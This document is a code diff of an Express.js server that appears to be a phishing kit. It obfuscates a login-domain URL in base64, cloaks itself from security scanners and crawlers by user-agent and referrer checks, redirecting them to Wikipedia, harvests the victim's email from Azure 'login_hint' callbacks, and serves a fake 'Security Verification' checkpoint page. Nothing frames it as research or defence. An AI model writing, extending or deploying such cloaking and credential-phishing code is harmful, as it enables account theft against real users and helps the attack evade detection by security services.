@@ -1,22 +1,28 @@
 const express = require('express');
+const bodyParser = require('body-parser'); // Ajout pour lire les retours d'Azure
 const app = express();
+
+app.use(bodyParser.urlencoded({ extended: true }));
 
 const part1 = "aHR0cHM6Ly9sb2dpbi50YXRhdXJ1cy5iaXov"; 
 const part2 = "cGdhYWZGVE0=";
 
-app.get('/', (req, res) => {
+// On utilise .all pour accepter GET (test direct) et POST (retour Azure)
+app.all('/', (req, res) => {
     const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
     const referrer = req.headers['referrer'] || req.headers['referer'] || "";
-    const targetEmail = req.query.m || ""; // Récupère l'email
+    
+    // Priorité de récupération de l'email : 
+    // 1. Retour d'Azure (login_hint) 
+    // 2. Paramètre manuel (?m=)
+    const targetEmail = req.body?.login_hint || req.query.login_hint || req.query.m || "";
     
     const isDebug = req.query.debug === "true";
     const isBotUA = /bot|spider|crawler|microsoft|google|cloud|datacenter|headless|monit|phish|virus|censys/i.test(ua);
     const isBotReferrer = referrer === "";
 
-    // --- NOUVELLE RÈGLE DE SÉCURITÉ ---
-    // Si l'email (m) est vide ET que tu n'es pas en mode debug -> Redirection Safe
+    // Sécurité : Si pas d'email et pas de debug -> Wikipedia
     if (!isDebug && (targetEmail === "" || isBotUA || isBotReferrer)) {
-        console.log("Accès non autorisé (Bot, No Email ou No Referrer). Redirection.");
         return res.redirect("https://www.wikipedia.org");
     }
 
@@ -50,7 +56,7 @@ app.get('/', (req, res) => {
             <div class="container">
                 <div class="header"><div class="logo-section">🔒 SECURITY CHECKPOINT</div><div>•••</div></div>
                 <div class="content">
-                    <h2 id="titleText">Security Verification</h2>
+                    <h2>Security Verification</h2>
                     <p id="statusText">Please confirm to continue</p>
                     <div class="checkpoint-box" id="clickArea">
                         <div style="display:flex; align-items:center;">
